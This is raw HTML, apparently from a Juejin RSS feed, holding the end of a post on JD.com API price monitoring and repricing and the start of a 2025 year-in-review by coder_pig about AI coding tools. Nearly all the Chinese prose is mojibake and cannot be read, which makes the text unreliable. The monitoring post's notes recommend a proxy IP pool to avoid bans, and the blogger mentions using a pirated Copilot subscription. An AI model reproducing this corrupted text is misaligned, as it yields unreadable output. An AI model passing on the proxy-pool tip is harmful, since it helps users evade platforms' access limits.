<p>åŸºäºå†å²ä»·æ ¼æ•°æ®å»ºç«‹é¢„æµ‹æ¨¡å‹ï¼š <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>P</mi><mrow><mi>t</mi><mo>+</mo><mn>1</mn></mrow></msub><mo>=</mo><mi>Î±</mi><msub><mi>P</mi><mi>t</mi></msub><mo>+</mo><mi>Î²</mi><mfrac><mn>1</mn><mi>n</mi></mfrac><msubsup><mo>âˆ‘</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></msubsup><msub><mi>P</mi><mrow><mi>t</mi><mo>âˆ’</mo><mi>i</mi></mrow></msub><mo>+</mo><mi>Î³</mi><mi>S</mi></mrow><annotation encoding="application/x-tex">P_{t+1} = \alpha P_t + \beta \frac{1}{n} \sum_{i=1}^{n} P_{t-i} + \gamma S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8917em;vertical-align:-0.2083em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord mathnormal" style="margin-right:0.0037em;">Î±</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1.1901em;vertical-align:-0.345em;"/><span class="mord mathnormal" style="margin-right:0.05278em;">Î²</span><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8451em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">âˆ‘</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8043em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2997em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mbin mtight">âˆ’</span><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.05556em;">Î³</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span></span> å…¶ä¸­ï¼š</p>
<ul>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>P</mi><mi>t</mi></msub></mrow><annotation encoding="application/x-tex">P_t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> è¡¨ç¤ºå½“å‰ä»·æ ¼</li>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span></span> è¡¨ç¤ºå­£èŠ‚æ€§å› ç´ </li>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Î±</mi><mo separator="true">,</mo><mi>Î²</mi><mo separator="true">,</mo><mi>Î³</mi></mrow><annotation encoding="application/x-tex">\alpha, \beta, \gamma</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.0037em;">Î±</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal" style="margin-right:0.05278em;">Î²</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal" style="margin-right:0.05556em;">Î³</span></span></span></span></span> ä¸ºæƒé‡ç³»æ•°</li>
</ul>
<h4 data-id="heading-6">äº”ã€å…¸å‹åº”ç”¨åœºæ™¯</h4>
<ol>
<li><strong>ä¿ƒé”€å“åº”ç³»ç»Ÿ</strong>ï¼šå½“ç«å“é™ä»·5%æ—¶è‡ªåŠ¨è§¦å‘è°ƒä»·æœºåˆ¶</li>
<li><strong>åº“å­˜ä¼˜åŒ–</strong>ï¼šç»“åˆä»·æ ¼è¶‹åŠ¿é¢„æµ‹åˆ¶å®šé‡‡è´­è®¡åˆ’</li>
<li><strong>ä»·æ ¼åŒºé—´åˆ†æ</strong>ï¼šè¯†åˆ«æœ€ä½³ä»·æ ¼å¸¦æå‡è½¬åŒ–ç‡</li>
</ol>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">auto_adjust_price</span>(<span class="hljs-params">current_price, competitor_price</span>):
    <span class="hljs-keyword">if</span> competitor_price &lt; current_price * <span class="hljs-number">0.95</span>:
        <span class="hljs-keyword">return</span> competitor_price * <span class="hljs-number">0.98</span>  <span class="hljs-comment"># ä¿æŒ2%ä»·æ ¼ä¼˜åŠ¿</span>
    <span class="hljs-keyword">return</span> current_price
</code></pre>
<p><img src="" alt="" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<h4 data-id="heading-7">å…­ã€æ³¨æ„äº‹é¡¹</h4>
<ol>
<li>éµå®ˆäº¬ä¸œAPIè°ƒç”¨é¢‘ç‡é™åˆ¶ï¼ˆé»˜è®¤1000æ¬¡/æ—¥ï¼‰</li>
<li>æ•æ„Ÿæ•°æ®éœ€åŠ å¯†å­˜å‚¨</li>
<li>å»ºè®®ä½¿ç”¨ä»£ç†IPæ± é˜²æ­¢å°ç¦</li>
<li>å¼‚å¸¸æ³¢åŠ¨æ•°æ®éœ€è®¾ç½®è¿‡æ»¤é˜ˆå€¼</li>
</ol>
<h4 data-id="heading-8">ç»“è¯­</h4>
<p>é€šè¿‡äº¬ä¸œAPIæ„å»ºçš„ä»·æ ¼ç›‘æ§ç³»ç»Ÿï¼ŒæŸå®¶ç”µå“ç‰ŒæˆåŠŸå°†ä»·æ ¼å“åº”æ—¶é—´ä»24å°æ—¶ç¼©çŸ­è‡³15åˆ†é’Ÿï¼Œä¿ƒé”€æœŸé—´é”€å”®é¢æå‡37%ã€‚ç«‹å³è¡ŒåŠ¨ï¼Œè®©æ•°æ®é©±åŠ¨çš„å®šä»·ç­–ç•¥æˆä¸ºæ‚¨çš„æ ¸å¿ƒç«äº‰åŠ›ï¼</p>
<blockquote>
<p><strong>æŠ€æœ¯æ ˆæ¨è</strong>ï¼šPython + InfluxDB + Grafana + Docker<br/>
<strong>æ‰©å±•æ–¹å‘</strong>ï¼šç»“åˆè¯„è®ºæƒ…æ„Ÿåˆ†æä¼˜åŒ–äº§å“å®šä»·ï¼Œæ¥å…¥ä¾›åº”é“¾APIå®ç°å…¨é“¾è·¯è°ƒæ§</p>
</blockquote>
<p>â€‹</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[2025 å¤ç›˜ | ç©¿è¶ŠAIç„¦è™‘å‘¨æœŸï¼Œè¿›åŒ–ä¸º "AIå…¨æ ˆ"]]></title>    <link>https://juejin.cn/post/7581648776303755273</link>    <guid>https://juejin.cn/post/7581648776303755273</guid>    <pubDate>2025-12-09T09:36:14.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581648776303755273" data-draft-id="7581688255624642612" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="2025 å¤ç›˜ | ç©¿è¶ŠAIç„¦è™‘å‘¨æœŸï¼Œè¿›åŒ–ä¸º &quot;AIå…¨æ ˆ&quot;"/> <meta itemprop="keywords" content="AIç¼–ç¨‹,AIGC,äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2025-12-09T09:36:14.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="coder_pig"/> <meta itemprop="url" content="https://juejin.cn/user/4142615541321928"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            2025 å¤ç›˜ | ç©¿è¶ŠAIç„¦è™‘å‘¨æœŸï¼Œè¿›åŒ–ä¸º "AIå…¨æ ˆ"
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4142615541321928/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    coder_pig
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T09:36:14.000Z" title="Tue Dec 09 2025 09:36:14 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»32åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="" data-highlight-key="a11y-dark">.hljs-comment,.hljs-quote{color:#d4d0ab}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#ffa07a}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#f5ab35}.hljs-attribute{color:gold}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#abe338}.hljs-section,.hljs-title{color:#00e0e0}.hljs-keyword,.hljs-selector-tag{color:#dcc6e0}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#2b2b2b;color:#f8f8f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}@media screen and (-ms-high-contrast:active){.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-comment,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-quote,.hljs-string,.hljs-symbol,.hljs-type{color:highlight}.hljs-keyword,.hljs-selector-tag{font-weight:700}}</style><h2 data-id="heading-0">1. ä»Šå¹´ä¸€å®š</h2>
<p>å¥½å‡ å¹´æ²¡å†™ã€Œ<strong>å¹´ç»ˆæ€»ç»“</strong>ã€ï¼Œç¿»äº†ä¸‹ã€Œ<strong>æ˜é‡‘</strong>ã€ï¼Œä¸Šä¸€ç¯‡è¿˜åœç•™åœ¨ã€Œ<strong>2021å¹´</strong>ã€ï¼Œå€’ä¸æ˜¯è¿™å‡ å¹´æ²¡æ´»è¿‡ï¼Œä¹Ÿä¸æ˜¯ä¸æƒ³å†™ï¼Œåªæ˜¯æ¯æ¬¡éƒ½æ­¢æ­¥äºã€Œ<strong>æ‹–å»¶</strong>ã€ã€‚æ¯åˆ°å¹´åº•ï¼Œè„‘å­é‡Œå°±ä¼šè¹¦å‡ºçš„å„ç§æƒ³æ³•ï¼Œè¢«æˆ‘é›¶æ•£åœ°è®°å½•åœ¨ "<strong>å¤§çº²ç¬”è®°</strong>" ä¸­ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/20e152f771f443daabaede04c491e236~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765877774&amp;x-signature=3C9jgS8ee2%2F%2BcUBkMeZFXMPHBFo%3D" alt="" loading="lazy"/></p>
<p>å†™è¿™ç©æ„æŒºåºŸã€Œ<strong>æ—¶é—´</strong>ã€å’Œã€Œ<strong>å¿ƒåŠ›</strong>ã€ï¼Œæ‰€ä»¥æ€»æƒ³ç€ "<strong>æ‰¾ä¸ªå‘¨æœ«ï¼ŒèŠ±ä¸€å¤§å—æ—¶é—´ï¼Œå¥½å¥½æ¢³ç†ä¸€ä¸‹</strong>"ï¼Œç»“æœéƒ½æ˜¯ä¸€æ‹–å†æ‹–ï¼šæ‹–åˆ°å…ƒæ—¦ï¼Œæ‹–åˆ°æ˜¥èŠ‚ï¼Œæ‹–åˆ°å…ƒå®µã€‚</p>
<p>ç„¶åï¼Œè½¬å¿µä¸€æƒ³ï¼š"è¿™éƒ½æ˜å¹´äº†ï¼Œè¿˜å†™ä¸ªğŸ£æ¯›å•Šï¼Ÿç®—äº†ï¼Œç®—äº†ï¼Œæ˜å¹´ä¸€å®šï¼"ã€‚2022ã€2023ã€2024 å°±åœ¨è¿™æ ·çš„ "<strong>æ˜å¹´ä¸€å®š</strong>" ä¸­æºœèµ°äº†...</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/490f615cfef74427bba980820cd92b81~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765877774&amp;x-signature=5q9ArQASw%2BVEYSh0aNo3%2FGsia3Q%3D" alt="" loading="lazy"/></p>
<hr/>
<p><strong>äººåˆ°ä¸­å¹´</strong>ï¼Œä¸»è§‚æ„Ÿè§‰ã€Œ<strong>æ—¶é—´</strong>ã€è¿‡å¾—è¶Šæ¥è¶Šå¿«ï¼Œã€Œ<strong>è®°æ€§</strong>ã€ ä¹Ÿå¤§ä¸å¦‚å‰ï¼Œå¾ˆå¤šå½“æ—¶è§‰å¾— "<strong>åˆ»éª¨é“­å¿ƒ</strong>" çš„ç¬é—´ (å¦‚ï¼šç»“å©šã€å½“çˆ¹)ï¼Œå¦‚ä»Šå›å¿†èµ·ï¼Œå°±å‰©ä¸‹ä¸€ä¸ª "<strong>æ¨¡ç³Šçš„è½®å»“</strong>"ã€‚ä¸å†™çš„è¯ï¼Œåˆæ˜¯ã€Œ<strong>æ‘¸</strong> <strong>ğŸŸ</strong>ã€ä¸€å¹´ï¼Œè¶ç€ <strong>2025</strong> å¹´è¿˜æ²¡è¿‡å®Œï¼Œå¾ˆå¤šæ„Ÿè§‰è¿˜æ˜¯çƒ­ä¹çš„ï¼Œèµ¶ç´§åŠ¨ç¬”ï¼Œ<strong>ä»Šå¹´ä¸€å®š</strong>ï¼ï¼ï¼</p>
<h2 data-id="heading-1">2. å¦‚æ­¤ç”Ÿæ´»30å¹´ï¼Œç›´åˆ°å¤§å¦å´©å¡Œ</h2>
<p><strong>2025</strong> å¹´ï¼Œå¯¹æˆ‘å†²å‡»æœ€å¤§çš„å½“å± "<strong>AI</strong>"ï¼Œå¤§åˆ°è®©æˆ‘ä¸å¾—ä¸é‡æ–°å®¡è§†ã€Œ<strong>è‡ªå·±çš„å·¥ä½œå’Œä»·å€¼</strong>ã€ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e5b3b08a31d44a3f832cfbe9ea26d1e3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765877774&amp;x-signature=nqmCHwec%2FQvU0aP1vVEIiEV3SQI%3D" alt="" loading="lazy"/></p>
<p>æˆ‘æ¥è§¦ <strong>AI</strong> å¹¶ä¸ç®—æ™šï¼Œ<strong>2024</strong> å¹´é‚£ä¼šè·Ÿé£ç©äº†ä¸‹ <strong>ChatGPT</strong>ï¼Œåé¢åœ¨ <strong>GitHub Copilot</strong> (ä¾¿å®œç›—ç‰ˆï¼Œ30Â¥/æœˆ) çš„ååŠ©ä¸‹ï¼Œå¿«é€Ÿäº¤ä»˜äº†ä¸€ä¸ªçˆ¬è™«å•å­ã€‚å°åˆ° "<strong>ææ•ˆç”œå¤´</strong>" çš„æˆ‘ï¼Œå’¬å’¬ç‰™ä¸Šäº† <strong>å¹´ä»˜æ­£ç‰ˆ</strong> (100åˆ€/å¹´) çš„è½¦ã€‚</p>
<p>å½“æ—¶ <strong>AI</strong> åœ¨æˆ‘çš„çœ¼é‡Œï¼Œåªæ˜¯ä¸ª "<strong>æ¯”è¾ƒèªæ˜çš„ä»£ç è¡¥å…¨å·¥å…·</strong>"ï¼Œå¯ä»¥å¸®æˆ‘å°‘äº›å‡ è¡Œä»£ç ï¼Œä»…æ­¤è€Œå·²ï¼Œå› ä¸º <strong>é€»è¾‘è¿˜å¾—æˆ‘æ¥æŠŠæ§</strong>ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f60f458ec2084efa98652144b594f347~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765877774&amp;x-signature=HEe%2FrsObqTnhxMrjyVVQ9hAUGSM%3D" alt="" loading="lazy"/></p>
<p>ä½†åˆ°äº† <strong>2025</strong> å¹´ï¼Œäº‹æƒ…å´å˜å¾—æœ‰ç‚¹ä¸ä¸€æ ·äº†ï¼š</p>
<blockquote>
<p>AIèƒ½è¯»æ‡‚/åˆ†ææ•´ä¸ªé¡¹ç›®ã€é‡æ„å±å±±ä»£ç ã€æŠŠä¸€ä¸ªæ¨¡ç³Šçš„ä¸šåŠ¡éœ€æ±‚å®ç°å¾—æœ‰æ¨¡æœ‰æ ·ã€‚</p>
</blockquote>
<p>å½“ç„¶ï¼Œæœ€è®©æˆ‘ "<strong>ç ´é˜²</strong>" çš„è¿˜æ˜¯å®ƒçš„ "<strong>è§£BUG</strong>" èƒ½åŠ›ï¼š</p>
<blockquote>
<p>æŒ‰ç…§ä»¥å¾€çš„ä¹ æƒ¯ï¼Œæˆ‘å¾—å» <strong>Google</strong>ã€ç¿» <strong>Stack Overflow</strong>ã€çœ‹æºç ï¼Œå°‘è¯´å¾—æŠ˜è…¾åŠå¤©ã€‚ç°åœ¨ï¼ŒæŠŠ <strong>æŠ¥é”™æ—¥å¿—</strong> å’Œ <strong>ç›¸å…³ä»£ç </strong> ä¸¢ç»™å®ƒï¼Œé€šå¸¸å‡ ç§’å°±èƒ½ï¼š<strong>æŒ‡å‡ºé—®é¢˜æ‰€åœ¨</strong>ï¼Œ<strong>ç»™å‡ºè§£å†³æ–¹æ¡ˆ</strong>ï¼Œç”šè‡³å¯ä»¥ <strong>å¸®æˆ‘æ”¹å¥½å¹¶æµ‹è¯•é€šè¿‡</strong>ã€‚</p>
</blockquote>
